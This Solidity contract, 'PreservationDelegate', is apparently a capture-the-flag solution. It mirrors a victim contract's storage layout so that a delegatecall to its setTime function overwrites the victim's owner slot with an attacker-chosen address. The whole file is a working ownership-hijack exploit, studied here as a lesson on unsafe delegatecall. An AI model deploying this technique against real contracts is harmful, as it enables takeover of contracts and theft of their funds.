// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationDelegate {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  function setTime(uint256 timeStamp) public {
      address newOwner = address(uint160(timeStamp));
      owner = newOwner;
  }
}